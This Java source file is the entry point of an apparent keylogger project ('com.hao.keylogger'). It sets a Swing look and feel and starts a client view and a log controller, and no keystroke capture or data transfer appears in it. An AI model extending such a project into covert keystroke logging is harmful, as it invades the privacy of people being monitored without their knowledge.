package com.hao.keylogger.program;

import java.util.Date;

import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;

import com.hao.keylogger.controllers.Client.ClientLogController;
import com.hao.keylogger.models.Log;
import com.hao.keylogger.views.ClientView;
import com.hao.keylogger.views.ILookAndFeel;

public class ClientKeyLoggerProgram implements ILookAndFeel{

	public ClientKeyLoggerProgram() {
		
	}
	
	public static void main(String[] args) {
		ILookAndFeel.setLookAndFeel();
		ClientView clientView =   new ClientView();		
		ClientLogController controller = new ClientLogController(clientView);
	}

}
